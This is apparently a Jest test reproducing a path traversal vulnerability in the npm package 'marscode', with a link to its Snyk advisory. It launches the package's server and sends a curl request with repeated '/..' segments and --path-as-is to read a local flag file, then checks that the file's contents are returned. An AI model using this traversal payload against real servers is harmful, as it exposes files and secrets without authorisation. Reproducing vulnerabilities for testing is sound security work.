//https://snyk.io/vuln/SNYK-JS-MARSCODE-590122
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in marscode", (done) => {
  //const Server = require('marked-tree');
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr()}"`;
  let server = "node ./node_modules/marscode/index.js ";

  exec(server, (error, stdout) => {
    exec(attack_string, (error, stdout) => {
      expect(stdout).toBe(hostsFile);
      //srv.stop(); // without stopping the server, Jest hangs
      done();
    });
  });
});
